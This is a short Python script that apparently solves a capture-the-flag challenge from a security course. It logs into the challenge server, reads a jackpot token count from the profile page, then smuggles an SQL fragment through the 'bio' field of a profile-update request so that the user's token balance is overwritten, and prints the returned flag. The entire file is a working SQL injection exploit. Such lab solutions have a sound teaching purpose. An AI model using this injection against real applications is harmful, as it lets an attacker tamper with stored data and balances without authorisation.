import requests
import re

SERVER = "http://ssof2526.challenges.cwte.me"
PORT = 25261

link = f'{SERVER}:{PORT}'
s = requests.Session()

data = {'username' : 'teste2345', 'password' : '1234'}
s.post(f'{link}/login', data=data)

# get the number of tokens
profile = s.get(f'{link}/profile').text
sentence = re.search(r"JACKPOT at \d+ tokens",profile).group(0)
tokens = re.search(r"\d+", sentence).group(0)

# inject SQL in bio
data = {'age': "", "bio" : f"', tokens = {tokens}, bio ='"}
profile = s.post(f'{link}/update_profile', data=data).text

# get the flag
flag = re.search("SSof{.*}", profile).group(0)
print(flag)